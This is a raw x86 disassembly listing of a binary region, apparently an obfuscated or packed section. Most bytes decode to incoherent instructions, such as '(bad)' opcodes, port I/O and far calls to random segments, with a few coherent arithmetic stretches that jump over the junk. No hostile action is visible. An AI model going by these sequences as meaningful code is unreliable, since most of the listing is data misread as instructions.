  40cfd3:	or     BYTE PTR [eax+0x8],ah
  40cfd6:	jge    0x40d034
  40cfd8:	popf   
  40cfd9:	mov    cl,0x9b
  40cfdb:	pushf  
  40cfdc:	fmul   DWORD PTR [edx]
  40cfde:	shr    DWORD PTR [edx],0x2a
  40cfe1:	lods   eax,DWORD PTR ds:[esi]
  40cfe2:	cmp    al,0x2e
  40cfe4:	and    al,0xb4
  40cfe6:	ror    bl,0x95
  40cfe9:	pop    eax
  40cfea:	pop    eax
  40cfeb:	adc    eax,0x9a90a030
  40cff0:	sti    
  40cff1:	dec    ebx
  40cff2:	nop
  40cff3:	imul   edi,DWORD PTR [esi],0xb2cbabb
  40cff9:	xchg   esi,ebx
  40cffb:	mov    ds:0x74a9b16e,eax
  40d000:	jle    0x40d066
  40d002:	daa    
  40d003:	outs   dx,DWORD PTR ds:[esi]
  40d004:	or     bh,bh
  40d006:	inc    edi
  40d007:	jmp    0x3d0:0x33dc7d8b
  40d00e:	ror    DWORD PTR [edi],1
  40d010:	scas   eax,DWORD PTR es:[edi]
  40d011:	xlat   BYTE PTR ds:[ebx]
  40d012:	jmp    0x40d385
  40d017:	retf   
  40d018:	jo     0x40cff3
  40d01a:	or     ah,BYTE PTR [ecx-0x63]
  40d01d:	jmp    0x40d09c
  40d01f:	sahf   
  40d020:	xor    dl,dh
  40d022:	ins    BYTE PTR es:[edi],dx
  40d023:	nop
  40d024:	add    cl,al
  40d026:	jno    0x40cfb9
  40d028:	lahf   
  40d029:	jl     0x40d0a7
  40d02b:	retf   0x7c79
  40d02e:	jl     0x40d021
  40d030:	push   esp
  40d031:	fnstsw WORD PTR [eax-0x70]
  40d034:	mov    bh,0xa9
  40d036:	pop    es
  40d037:	push   0xdf359f8e
  40d03c:	repz sbb eax,0x6f842e03
  40d042:	mov    edx,0x5051794e
  40d047:	loop   0x40d0ab
  40d049:	xchg   BYTE PTR [ebx+0x1d],ch
  40d04c:	inc    ebx
  40d04d:	mov    ah,0xc8
  40d04f:	sbb    DWORD PTR [ebx-0x78bd5cae],0x80af5c3b
  40d059:	clc    
  40d05a:	or     dl,BYTE PTR [ecx]
  40d05c:	or     dl,BYTE PTR [esi-0x1ac725b6]
  40d062:	scas   eax,DWORD PTR es:[edi]
  40d063:	or     dl,ah
  40d065:	sub    BYTE PTR [eax],ch
  40d067:	std    
  40d068:	sbb    DWORD PTR [esi-0x3cdd83dc],0xc8515bd7
  40d072:	ret    
  40d073:	cmp    dh,ah
  40d075:	mov    ebx,0xf4b88da3
  40d07a:	push   cs
  40d07b:	xor    BYTE PTR [eax-0xb],al
  40d07e:	mov    ebp,0xc059f074
  40d083:	push   ebx
  40d084:	inc    esp
  40d085:	rol    DWORD PTR [edi-0x829ba49],0x6b
  40d08c:	scas   eax,DWORD PTR es:[edi]
  40d08d:	je     0x40d0f6
  40d08f:	rcpps  xmm7,xmm4
  40d092:	dec    eax
  40d093:	test   ebx,ebp
  40d095:	xor    BYTE PTR [edx],al
  40d097:	inc    ebx
  40d098:	dec    esp
  40d099:	jge    0x40d08a
  40d09b:	and    bh,dl
  40d09d:	dec    ebx
  40d09e:	or     BYTE PTR [edx],dh
  40d0a0:	add    ecx,DWORD PTR [esi-0x152d314d]
  40d0a6:	adc    eax,0x8527f88
  40d0ab:	mov    al,0x47
  40d0ad:	rol    DWORD PTR [ebx],cl
  40d0af:	sbb    al,0x89
  40d0b1:	test   BYTE PTR [esi+eiz*4+0x1b],dh
  40d0b5:	into   
  40d0b6:	mov    ecx,0x78b31a89
  40d0bb:	xor    al,0xda
  40d0bd:	jno    0x40d0df
  40d0bf:	(bad)  
  40d0c0:	cmc    
  40d0c1:	inc    edi
  40d0c2:	scas   eax,DWORD PTR es:[edi]
  40d0c3:	mov    ds:0x71f55e23,eax
  40d0c8:	dec    eax
  40d0c9:	(bad)  
  40d0ca:	call   0x6256ae54
  40d0cf:	pop    edi
  40d0d0:	push   0xffffff9e
  40d0d2:	mov    dl,0x76
  40d0d4:	add    cl,BYTE PTR [edx-0x19e6e5f0]
  40d0da:	arpl   WORD PTR [edi+edi*8-0x3065f309],cx
  40d0e1:	sbb    eax,0xc60ea66e
  40d0e6:	jle    0x40d15e
  40d0e8:	sub    al,0x3a
  40d0ea:	stos   DWORD PTR es:[edi],eax
  40d0eb:	fstp   TBYTE PTR [edx]
  40d0ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0ee:	out    dx,al
  40d0ef:	lock mov cl,0xc7
  40d0f2:	fs stc 
  40d0f4:	clc    
  40d0f5:	add    ch,BYTE PTR [ebp+0x73]
  40d0f8:	jmp    0x40d0b2
  40d0fa:	push   ebp
  40d0fb:	bound  esp,QWORD PTR [edi+0x6ca872d6]
  40d101:	rep stos DWORD PTR es:[edi],eax
  40d103:	sti    
  40d104:	rcl    DWORD PTR [ebp-0x2a],0xa4
  40d108:	sbb    ch,BYTE PTR [edi+0x6cc86067]
  40d10e:	lds    ecx,FWORD PTR [edi]
  40d110:	cld    
  40d111:	je     0x40d17a
  40d113:	call   0x52b4:0x32e98cc2
  40d11a:	lea    edx,[esi]
  40d11c:	popf   
  40d11d:	push   ss
  40d11e:	dec    esi
  40d11f:	sub    eax,0x83975ecc
  40d124:	pop    ebx
  40d125:	retf   
  40d126:	pop    edi
  40d127:	xlat   BYTE PTR ds:[ebx]
  40d128:	mov    al,ds:0x1c694fd8
  40d12d:	cs dec ebx
  40d12f:	cmp    BYTE PTR [edi-0x2d83b690],ah
  40d135:	and    al,0xd2
  40d137:	inc    dh
  40d139:	push   0x2502a4e2
  40d13e:	sti    
  40d13f:	hlt    
  40d140:	frstor [ebx]
  40d142:	mov    eax,0x5d450bda
  40d147:	pop    esi
  40d148:	call   0x7d40:0x4697f0f4
  40d14f:	test   al,0x57
  40d151:	adc    eax,DWORD PTR [eax-0x3a9c1d72]
  40d157:	je     0x40d187
  40d159:	ss mov edi,0xdfb86267
  40d15f:	lock xchg esp,eax
  40d161:	and    ebx,DWORD PTR [edi]
  40d163:	test   DWORD PTR [ebp+0x31aa539f],0x564e7154
  40d16d:	inc    ebx
  40d16e:	stos   DWORD PTR es:[edi],eax
  40d16f:	push   esp
  40d170:	mov    bl,0x84
  40d172:	inc    eax
  40d173:	mov    dh,0x94
  40d175:	mov    dh,0x5b
  40d177:	fs mov esp,0x26e049d2
  40d17d:	jnp    0x40d17a
  40d17f:	dec    esi
  40d180:	popf   
  40d181:	push   edi
  40d182:	out    dx,eax
  40d183:	jno    0x40d169
  40d185:	inc    esi
  40d186:	dec    ebp
  40d187:	cmp    al,0x71
  40d189:	xor    al,0x1b
  40d18b:	dec    eax
  40d18c:	or     eax,0xa15142e7
  40d191:	ficom  DWORD PTR [edx-0x473afef1]
  40d197:	cmp    dl,BYTE PTR [esi-0x54]
  40d19a:	cmp    ebx,DWORD PTR [edx]
  40d19c:	xchg   BYTE PTR [eax+esi*8],cl
  40d19f:	adc    eax,0x5d6f5569
  40d1a4:	xor    eax,0xdba3754c
  40d1a9:	cld    
  40d1aa:	and    al,0x3c
  40d1ac:	popa   
  40d1ad:	sbb    DWORD PTR [edx+eiz*4],ebx
  40d1b0:	repz sbb eax,0x8cb73493
  40d1b6:	pop    ebp
  40d1b7:	xchg   ebp,eax
  40d1b8:	mov    edi,0x7e05ac60
  40d1bd:	in     al,dx
  40d1be:	or     dl,bl
  40d1c0:	shl    al,cl
  40d1c2:	cmp    eax,0xb299f87c
  40d1c7:	(bad)  [ebp-0x1b]
  40d1ca:	mov    al,ds:0xeda3b933
  40d1cf:	xlat   BYTE PTR ds:[ebx]
  40d1d0:	scas   eax,DWORD PTR es:[edi]
  40d1d1:	sbb    al,0x6d
  40d1d3:	mov    bl,0x31
  40d1d5:	inc    ebx
  40d1d6:	rol    BYTE PTR ds:0x2740406d,1
  40d1dc:	sbb    al,0xb9
  40d1de:	mov    ebx,0xf00d87d2
  40d1e3:	call   0x2551:0x50de9aa6
  40d1ea:	add    cl,BYTE PTR [ecx-0x80]
  40d1ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1ee:	mov    esp,0x6ba4f583
  40d1f3:	cmp    ch,ch
  40d1f5:	xchg   esp,eax
  40d1f6:	test   al,0x11
  40d1f8:	popf   
  40d1f9:	xchg   ebx,eax
  40d1fa:	retf   
  40d1fb:	jle    0x40d194
  40d1fd:	in     eax,0xa1
  40d1ff:	sbb    DWORD PTR [esi-0x1e],0xffffffc7
  40d203:	loopne 0x40d25a
  40d205:	mov    dl,0x5
  40d207:	popa   
  40d208:	jno    0x40d201
  40d20a:	mov    cl,0xfd
  40d20c:	xchg   edi,ebx
  40d20e:	stos   DWORD PTR es:[edi],eax
  40d20f:	pop    ss
  40d210:	jle    0x40d23f
  40d212:	call   0x2e3b:0x98430931
  40d219:	stos   DWORD PTR es:[edi],eax
  40d21a:	sti    
  40d21b:	mov    WORD PTR [ecx+0x79],es
  40d21e:	sub    al,0x60
  40d220:	test   al,0xa3
  40d222:	and    ecx,edx
  40d224:	xchg   edx,eax
  40d225:	fwait
  40d226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d227:	nop
  40d228:	xor    esi,DWORD PTR [eax-0x2bf5fd97]
  40d22e:	xor    eax,DWORD PTR [esp+edi*4]
  40d231:	in     eax,0x93
  40d233:	ret    
  40d234:	pushf  
  40d235:	xchg   ecx,eax
  40d236:	xor    BYTE PTR [ecx],ch
  40d238:	addr16 push edx
  40d23a:	or     eax,DWORD PTR [ebp-0x3a85dbc6]
  40d240:	ret    
  40d241:	cmp    al,0x49
  40d243:	(bad)  
  40d244:	pop    ds
  40d245:	and    cl,ah
  40d247:	pop    edx
  40d248:	add    al,0x72
  40d24a:	sbb    eax,DWORD PTR [esi-0xb]
  40d24d:	xor    cl,dh
  40d24f:	push   eax
  40d250:	aam    0xb3
  40d252:	jmp    0x40d222
  40d254:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d256:	jmp    0x9f35:0xe80837ad
  40d25d:	in     eax,0xd6
  40d25f:	mov    esp,0xa32e46c6
  40d264:	inc    esp
  40d265:	addr16 pop eax
  40d267:	in     eax,0x9a
  40d269:	inc    esp
  40d26a:	sub    al,0x49
  40d26c:	push   edi
  40d26d:	test   al,0x52
  40d26f:	unpcklps xmm7,XMMWORD PTR [edx-0x45]
  40d273:	lds    eax,FWORD PTR [ebx-0x74]
  40d276:	jbe    0x40d249
  40d278:	push   ebx
  40d279:	inc    ebx
  40d27a:	adc    cl,dh
  40d27c:	addr16 cmp eax,0xc2e7454
  40d282:	sar    DWORD PTR [ebp+0x3862b0ad],0xfa
  40d289:	inc    edx
  40d28a:	imul   eax,DWORD PTR [ebx],0xffffff8a
  40d28d:	jnp    0x40d2c1
  40d28f:	mov    esp,0x1cf1906b
  40d294:	lods   eax,DWORD PTR ds:[esi]
  40d295:	(bad)  
  40d296:	int    0x29
  40d298:	jo     0x40d2cb
  40d29a:	cwde   
  40d29b:	pop    edi
  40d29c:	sbb    al,0x7c
  40d29e:	gs (bad) 
  40d2a0:	jl     0x40d29e
  40d2a2:	inc    eax
  40d2a3:	and    eax,0xdde86cb7
  40d2a8:	jecxz  0x40d256
  40d2aa:	xor    al,0xea
  40d2ac:	retf   0x73b3
  40d2af:	inc    ecx
  40d2b0:	push   ecx
  40d2b1:	stos   DWORD PTR es:[edi],eax
  40d2b2:	add    bl,BYTE PTR [edx+0x549fd28a]
  40d2b8:	stos   BYTE PTR es:[edi],al
  40d2b9:	mov    ch,0xb4
  40d2bc:	sub    al,0xc1
  40d2be:	mov    esi,0xe4517b44
  40d2c3:	sub    ecx,DWORD PTR [esi+0x1dc0ebb4]
  40d2c9:	mov    WORD PTR [ebp+0x78eec562],es
  40d2cf:	pop    ecx
  40d2d0:	adc    eax,0x5863cc23
  40d2d5:	sub    DWORD PTR [ebp+ecx*1+0x39f46aa],esp
  40d2dc:	stc    
  40d2dd:	pop    ebx
  40d2de:	and    BYTE PTR [ebx],bh
  40d2e0:	push   esp
  40d2e1:	inc    esp
  40d2e2:	xchg   esi,eax
  40d2e3:	inc    esp
  40d2e4:	add    bh,BYTE PTR [eax+0x3276429b]
  40d2ea:	loopne 0x40d2af
  40d2ec:	push   ebx
  40d2ed:	sub    DWORD PTR [esi+0x2560b2de],ebx
  40d2f3:	test   eax,0xcb20a8f4
  40d2f8:	or     DWORD PTR [ebx],esi
  40d2fa:	mov    ebp,eax
  40d2fc:	dec    esi
  40d2fd:	jo     0x40d2b6
  40d2ff:	pusha  
  40d300:	xor    DWORD PTR ds:0x650629a0,ebp
  40d306:	std    
  40d307:	sbb    eax,0xb65ef118
  40d30c:	mul    ch
  40d30e:	push   esp
  40d30f:	daa    
  40d310:	pop    ebx
  40d311:	addr16 ror cl,0x9d
  40d315:	fcomip st,st(7)
  40d317:	into   
  40d318:	loope  0x40d339
  40d31a:	push   ebp
  40d31b:	out    dx,al
  40d31c:	(bad)  
  40d31d:	stos   BYTE PTR es:[edi],al
  40d31e:	retf   0x6e3
  40d321:	(bad)
  40d324:	lock fs nop
  40d327:	das    
  40d328:	and    al,0xd0
  40d32a:	(bad)  
  40d32b:	icebp  
  40d32c:	shl    DWORD PTR [edx-0x5a],cl
  40d32f:	sbb    al,0xb5
  40d331:	xor    BYTE PTR [ebx+ebp*2+0x3f],cl
  40d335:	xor    al,BYTE PTR [eax+0x70d92c7a]
  40d33b:	push   0xe0c78b93
  40d340:	dec    ebp
  40d341:	mov    edx,0x3a3606bf
  40d346:	sub    BYTE PTR ds:0xfb3cfa2e,0x2f
  40d34d:	ss ja  0x40d309
  40d350:	int3   
  40d351:	xchg   esp,eax
  40d352:	sub    ch,BYTE PTR [edi]
  40d354:	ret    0x4e70
  40d357:	call   0x324d:0x826e3a40
  40d35e:	(bad)  
  40d360:	rcl    eax,1
  40d362:	pop    ebx
  40d363:	mov    edx,0xd22c0b67
  40d368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d369:	sbb    dh,0x6e
  40d36c:	adc    BYTE PTR ds:0xb9148627,al
  40d372:	cdq    
  40d373:	sbb    cl,al
  40d375:	xchg   esi,eax
  40d376:	call   0x1abf7ceb
  40d37b:	ret    0x7e72
  40d37e:	and    DWORD PTR [edx],edi
  40d380:	xor    ebx,esp
  40d382:	mov    dh,BYTE PTR [edx]
  40d384:	xor    DWORD PTR [ebx-0x7cc0b83],ecx
  40d38a:	sub    edx,edi
  40d38c:	mov    edi,DWORD PTR [ebp-0xc]
  40d38f:	mov    ebx,DWORD PTR [ebp-0x14]
  40d392:	xor    edi,eax
  40d394:	add    edi,ecx
  40d396:	imul   edi,ebx
  40d399:	mov    ebx,DWORD PTR [ebp-0x18]
  40d39c:	xor    ebx,eax
  40d39e:	sub    edx,ecx
  40d3a0:	lea    edi,[edi+ebx*1+0x32729a]
  40d3a7:	cmp    edi,edx
  40d3a9:	jbe    0x40c541
  40d3af:	mov    edx,DWORD PTR [ebp-0xc]
  40d3b2:	mov    edi,DWORD PTR [ebp-0x24]
  40d3b5:	jmp    0x40d728
  40d3ba:	mov    ebx,0xd1887f92
  40d3bf:	popf   
  40d3c0:	dec    ebx
  40d3c1:	pop    ebp
  40d3c2:	stc    
  40d3c3:	ss push edi
  40d3c5:	xchg   ebp,eax
  40d3c6:	or     al,0xce
  40d3c8:	rcr    DWORD PTR [ecx+0x7c7c986f],0xca
  40d3cf:	jns    0x40d44d
  40d3d1:	jl     0x40d363
  40d3d3:	inc    ebp
  40d3d4:	pushf  
  40d3d5:	or     eax,0x1d003013
  40d3da:	cli    
  40d3db:	out    0x26,al
  40d3dd:	fcom   QWORD PTR [eax+edi*2+0x5f]
  40d3e1:	ror    BYTE PTR [bp+si],cl
  40d3e4:	fist   WORD PTR [ebp+ebp*8-0x4daa4667]
  40d3eb:	cmp    ch,BYTE PTR [eax-0x3f]
  40d3ee:	push   ss
  40d3ef:	test   dl,0x8c
  40d3f2:	iret   
  40d3f3:	(bad)  
  40d3f4:	enter  0xc066,0xaf
  40d3f8:	cmc    
  40d3f9:	add    eax,0x2ec224bc
  40d3fe:	inc    edi
  40d3ff:	pop    ecx
  40d400:	pop    es
  40d401:	pop    esi
  40d402:	cs dec esi
  40d404:	mov    cl,0x2
  40d406:	mov    al,0x28
  40d408:	adc    BYTE PTR [edx-0x7283626b],bl
  40d40e:	and    DWORD PTR [edi-0x608fad71],edx
  40d414:	pop    edi
  40d415:	repz pop edx
  40d417:	outs   dx,DWORD PTR ds:[esi]
  40d418:	lods   eax,DWORD PTR ds:[esi]
  40d419:	arpl   WORD PTR [ecx+0x7152a09c],cx
  40d41f:	cdq    
  40d420:	sub    BYTE PTR [eax],bh
  40d422:	ret    
  40d423:	push   esp
  40d424:	cmp    edx,DWORD PTR [edi+0x4918c6cc]
  40d42a:	(bad)  
  40d42b:	out    0xb0,eax
  40d42d:	xchg   ecx,eax
  40d42e:	push   ds
  40d42f:	mov    ah,0x36
  40d431:	fisub  WORD PTR [esi-0x24]
  40d434:	test   DWORD PTR [ebp+0x78],eax
  40d437:	fidivr WORD PTR [esi+0xb281089]
  40d43d:	pop    eax
  40d43e:	test   BYTE PTR [eax-0x63],dl
  40d441:	sub    DWORD PTR [ebp-0x6801a7c2],0x64
  40d448:	loope  0x40d4c2
  40d44a:	mov    ch,BYTE PTR [ebx]
  40d44c:	pop    eax
  40d44d:	scas   eax,DWORD PTR es:[edi]
  40d44e:	cs aas 
  40d450:	adc    bl,BYTE PTR [ecx]
  40d452:	adc    eax,0xc41fa011
  40d457:	arpl   WORD PTR [ecx-0xf],bx
  40d45a:	sub    edi,DWORD PTR ds:0xa0849627
  40d460:	push   esp
  40d461:	rol    BYTE PTR [ebp+0x21],1
  40d464:	pop    edx
  40d465:	lea    ecx,[ebx+edx*2+0x45]
  40d469:	pop    ebx
  40d46b:	dec    ebp
  40d46c:	and    BYTE PTR [edx-0x456ab160],cl
  40d472:	add    BYTE PTR [edx+0x15024209],dh
  40d478:	or     esi,DWORD PTR [ebp-0x38]
  40d47b:	pop    ecx
  40d47c:	sub    eax,0x4b2e3478
  40d481:	jge    0x40d42f
  40d483:	xor    DWORD PTR [ecx],esi
  40d485:	inc    ecx
  40d486:	cmp    eax,0x1b970a1d
  40d48b:	lea    esi,[esp+eiz*4]
  40d48e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d48f:	retf   
  40d490:	and    ch,ch
  40d492:	xchg   ebp,eax
  40d493:	xchg   ecx,eax
  40d494:	call   FWORD PTR [edx+0x70d179e5]
  40d49a:	add    esi,DWORD PTR [ecx+edx*8+0x7]
  40d49e:	push   0x3f
  40d4a0:	mov    esp,esp
  40d4a2:	sub    ebx,DWORD PTR [ebp-0x36]
  40d4a5:	ffreep st(4)
  40d4a7:	dec    ebp
  40d4a8:	hlt    
  40d4a9:	push   ss
  40d4aa:	mov    esp,0x5fed566b
  40d4af:	xor    BYTE PTR [eax],al
  40d4b1:	mov    ds:0x68ae3447,eax
  40d4b6:	jle    0x40d530
  40d4b8:	push   ecx
  40d4b9:	push   ebx
  40d4ba:	test   eax,0x18dac7a7
  40d4bf:	ja     0x40d450
  40d4c1:	call   0xf44307a2
  40d4c6:	retf   0x3f2c
  40d4c9:	outs   dx,DWORD PTR ds:[esi]
  40d4ca:	(bad)  [ebp+0x54]
  40d4cd:	mov    eax,0xa787c69f
  40d4d2:	sub    bl,al
  40d4d4:	test   al,0xdf
  40d4d6:	lods   al,BYTE PTR ds:[esi]
  40d4d7:	(bad)  
  40d4d8:	push   ebp
  40d4d9:	sahf   
  40d4da:	sub    esi,esp
  40d4dc:	lds    edi,FWORD PTR [esi-0x45a4b060]
  40d4e2:	inc    edi
  40d4e3:	addr16 push ss
  40d4e5:	data16 jp 0x40d47a
  40d4e8:	xor    al,0x54
  40d4ea:	loopne 0x40d53c
  40d4ec:	out    dx,al
  40d4ed:	(bad)  
  40d4ef:	retf   
  40d4f0:	mov    ds:0x70d2b125,al
  40d4f5:	ret    
  40d4f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4f7:	jle    0x40d4b6
  40d4f9:	or     edx,DWORD PTR [ecx+0x6e]
  40d4fc:	fisttp DWORD PTR [ebp-0x655a77c4]
  40d502:	cmp    bl,BYTE PTR [ebx-0x62]
  40d505:	lods   al,BYTE PTR ds:[esi]
  40d506:	xchg   ebx,eax
  40d507:	jmp    0x2a87:0x21ee03e7
  40d50e:	cmp    BYTE PTR [eax+ebp*2+0x1695d4d7],ah
  40d515:	or     DWORD PTR [eax+0x55],ebp
  40d518:	or     ebx,0x63
  40d51b:	leave  
  40d51c:	and    edi,ebx
  40d51e:	ret    
  40d51f:	jbe    0x40d522
  40d521:	push   ebp
  40d522:	pop    eax
  40d523:	out    0xd3,eax
  40d525:	mov    al,ds:0x800612d4
  40d52a:	mov    eax,ds:0x6dc411ac
  40d52f:	data16 lahf 
  40d531:	mul    DWORD PTR [ebx+eiz*1]
  40d534:	dec    esp
  40d535:	vpackssdw xmm5,xmm5,XMMWORD PTR [edx+0x37]
  40d53b:	in     eax,0xe4
  40d53d:	jbe    0x40d4ce
  40d53f:	and    BYTE PTR [esp+edi*2-0x1347ce47],ch
  40d546:	xor    bh,dl
  40d548:	jp     0x40d5b5
  40d54a:	xchg   ebp,eax
  40d54b:	pop    edi
  40d54c:	mov    al,ds:0x6c95d3b6
  40d551:	stos   BYTE PTR es:[edi],al
  40d552:	loop   0x40d51c
  40d554:	out    dx,eax
  40d555:	sub    bl,dl
  40d557:	ret    0xc444
  40d55a:	stc    
  40d55b:	mov    DWORD PTR [edx+0x6b],eax
  40d55e:	data16 sub BYTE PTR [edi+0x1a42067a],al
  40d565:	pop    edi
  40d566:	or     bh,BYTE PTR [ecx]
  40d568:	loope  0x40d544
  40d56a:	xor    eax,0x97a65f92
  40d56f:	ja     0x40d535
  40d571:	out    dx,eax
  40d572:	adc    bh,BYTE PTR fs:[edi]
  40d575:	fwait
  40d576:	mov    edx,0x84cb62d5
  40d57b:	stos   BYTE PTR es:[edi],al
  40d57c:	jns    0x40d540
  40d57e:	lea    ebx,[esi]
  40d580:	mov    bl,0xdd
  40d582:	cmp    DWORD PTR ds:0xbd509348,0xffffffe7
  40d589:	dec    esi
  40d58a:	mov    eax,0x628b62d5
  40d58f:	push   ebx
  40d590:	cli    
  40d591:	sub    al,0xa1
  40d593:	and    esp,ecx
  40d595:	scas   al,BYTE PTR es:[edi]
  40d596:	imul   esp,DWORD PTR [ecx],0xf28ab76
  40d59c:	inc    esp
  40d59d:	dec    ebx
  40d59e:	or     DWORD PTR [ebx+0x35],ebp
  40d5a1:	or     esi,DWORD PTR [ebx+eax*1+0x7d9b8ab6]
  40d5a8:	jge    0x40d52a
  40d5aa:	or     eax,0x655c86c
  40d5af:	sti    
  40d5b0:	fldenv [edx-0x312221fb]
  40d5b6:	es popa 
  40d5b8:	adc    al,0xdb
  40d5ba:	mov    ebx,0x703ff059
  40d5bf:	out    dx,eax
  40d5c0:	jle    0x40d562
  40d5c2:	jg     0x40d566
  40d5c4:	sbb    al,0x80
  40d5c6:	pop    esi
  40d5c7:	int    0x3a
  40d5c9:	aam    0xb2
  40d5cb:	out    0xc8,eax
  40d5cd:	rcl    BYTE PTR [ebx+0x4d4f6ef],0xc9
  40d5d4:	cmp    edx,ebx
  40d5d6:	push   ds
  40d5d7:	xlat   BYTE PTR ds:[ebx]
  40d5d8:	pop    ecx
  40d5d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5da:	adc    edi,DWORD PTR [ebp-0x3c4eb253]
  40d5e0:	sbb    ecx,DWORD PTR [eax-0x294ceb01]
  40d5e6:	(bad)  
  40d5e7:	mov    edi,0xd4c1039b
  40d5ec:	stos   BYTE PTR es:[edi],al
  40d5ed:	mov    BYTE PTR [ebp-0x6c],dl
  40d5f0:	sbb    eax,0xbdc5911b
  40d5f5:	sub    cl,bl
  40d5f7:	ret    0x8534
  40d5fa:	push   0xa0deabb5
  40d5ff:	sbb    al,0xa5
  40d601:	inc    edx
  40d602:	xchg   edx,eax
  40d603:	xor    DWORD PTR [edx+0x19],ecx
  40d606:	xchg   edx,eax
  40d607:	mov    esi,es
  40d609:	repnz xlat BYTE PTR ds:[ebx]
  40d60b:	test   al,ch
  40d60d:	(bad)  
  40d60e:	xchg   BYTE PTR [esp+ebp*2-0xaa88b7],ch
  40d615:	push   esp
  40d616:	out    dx,al
  40d617:	imul   edi,DWORD PTR [esi+esi*8+0x648be12f],0x437e78fe
  40d622:	cli    
  40d623:	sbb    al,0x62
  40d625:	scas   al,BYTE PTR es:[edi]
  40d626:	aas    
  40d627:	fwait
  40d628:	retf   0xfa1d
  40d62b:	sbb    eax,ebx
  40d62d:	sub    al,0xd5
  40d62f:	addr16 xor al,0x3b
  40d632:	push   edx
  40d633:	repz repz and BYTE PTR ds:0x94670191,al
  40d63b:	lods   al,BYTE PTR ds:[esi]
  40d63c:	push   0x16ed3eaa
  40d641:	inc    eax
  40d642:	push   edx
  40d643:	(bad)  
  40d645:	(bad)  
  40d646:	fmul   DWORD PTR [esi+0xf]
  40d649:	bound  ebx,QWORD PTR [eax]
  40d64b:	call   0x7346ad4a
  40d650:	std    
  40d651:	aam    0x10
  40d653:	fidivr WORD PTR ds:0xc0f1d36b
  40d659:	nop
  40d65a:	ds loope 0x40d663
  40d65d:	sbb    eax,0x7b2da291
  40d662:	jl     0x40d6dd
  40d664:	push   ss
  40d665:	xor    eax,0xe7996fe2
  40d66a:	push   ss
  40d66b:	jno    0x40d6e5
  40d66d:	mov    al,ds:0xaa8772d5
  40d672:	sbb    eax,0xfeee0841
  40d677:	retf   
  40d678:	xlat   BYTE PTR ds:[ebx]
  40d679:	xor    ah,BYTE PTR [edx+0x59922df0]
  40d67f:	out    0x61,eax
  40d681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d682:	add    edx,DWORD PTR [ecx-0x6]
  40d685:	ret    
  40d686:	jecxz  0x40d69f
  40d688:	or     dl,BYTE PTR [ebx+edx*8]
  40d68b:	fcmovu st,st(0)
  40d68d:	pop    eax
  40d68e:	xor    esi,DWORD PTR [eax+0x7cf1f99d]
  40d694:	test   BYTE PTR ds:0x36f2e211,al
  40d69a:	push   ss
  40d69b:	pop    ecx
  40d69c:	jp     0x40d6c9
  40d69e:	sbb    bh,ah
  40d6a0:	(bad)  
  40d6a1:	je     0x40d6a2
  40d6a3:	xchg   DWORD PTR [eax+ebp*2-0x53],edi
  40d6a7:	dec    ebx
  40d6a8:	nop
  40d6a9:	js     0x40d6c1
  40d6ab:	pushf  
  40d6ac:	xchg   BYTE PTR [eax],dl
  40d6ae:	(bad)  
  40d6af:	out    dx,al
  40d6b0:	daa    
  40d6b1:	aam    0x2d
  40d6b3:	fnstcw WORD PTR [esi-0x25]
  40d6b6:	pusha  
  40d6b7:	push   edi
  40d6b8:	sbb    DWORD PTR [ebx+0xb62901c],eax
  40d6be:	mov    esi,?
  40d6c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6c1:	pop    esp
  40d6c2:	cmp    DWORD PTR [ebx-0x49f7fb16],eax
  40d6c8:	popa   
  40d6c9:	stc    
  40d6ca:	xchg   esi,eax
  40d6cb:	push   0xbd111d78
  40d6d0:	xchg   BYTE PTR [ebp-0x4e],dl
  40d6d3:	lahf   
  40d6d4:	in     eax,0x19
  40d6d6:	stc    
  40d6d7:	adc    eax,DWORD PTR [ebp+0x49]
  40d6da:	in     al,0xc
  40d6dc:	aas    
  40d6dd:	pop    edx
  40d6de:	mov    ch,0x63
  40d6e0:	jne    0x40d6f0
  40d6e2:	mov    WORD PTR [edx+0x12],ds
  40d6e5:	or     eax,0xf2f14902
  40d6ea:	pop    esp
  40d6eb:	cmp    al,0x8d
  40d6ed:	sub    BYTE PTR [esi+0x71],dh
  40d6f0:	out    0xb9,eax
  40d6f2:	xor    al,0xa7
  40d6f4:	jns    0x40d6db
  40d6f6:	push   es
  40d6f7:	mov    ah,0x8c
  40d6f9:	pop    ss
  40d6fa:	fwait
  40d6fb:	sbb    eax,0xf0658bf5
  40d700:	push   ebp
  40d701:	pushf  
  40d702:	rcr    ch,cl
  40d704:	imul   ebx,DWORD PTR [eax-0x73],0x3e
  40d708:	fiadd  DWORD PTR [ecx+edx*4+0x4153cb01]
  40d70f:	cmp    DWORD PTR [edi+0x1ac12f40],eax
  40d715:	inc    ecx
  40d716:	sub    DWORD PTR [edi+0x69e54dfb],ebp
  40d71c:	push   ecx
  40d71d:	mov    dh,0xb0
  40d71f:	mov    ebp,0x7222f0c
  40d724:	sub    al,0xc8
  40d726:	mov    BYTE PTR [ecx],ch
  40d728:	xor    edx,eax
  40d72a:	add    edx,ecx
  40d72c:	imul   edx,edi
  40d72f:	mov    edi,DWORD PTR [ebp-0x18]
  40d732:	xor    edi,eax
  40d734:	add    edx,edi
  40d736:	mov    edi,DWORD PTR [ebp-0x8]
  40d739:	lea    edx,[edx+edi*1+0x32729a]
  40d740:	mov    DWORD PTR [ebp-0x8],edx
  40d743:	mov    edx,DWORD PTR [ebp-0x20]
  40d746:	xor    edx,eax
  40d748:	mov    edi,0xffcd8d66
  40d74d:	sub    edi,edx
  40d74f:	add    edi,DWORD PTR [ebp-0x10]
  40d752:	mov    edx,DWORD PTR [ebp-0x20]
  40d755:	mov    ebx,DWORD PTR [ebp-0x8]
  40d758:	xor    edx,eax
  40d75a:	add    edx,ecx
  40d75c:	imul   edx,ebx
  40d75f:	cmp    edx,edi
  40d761:	jbe    0x40a06e
  40d767:	pop    ebx
  40d768:	pop    edi
  40d769:	leave  
  40d76a:	ret    0x8
  40d76d:	push   ebp
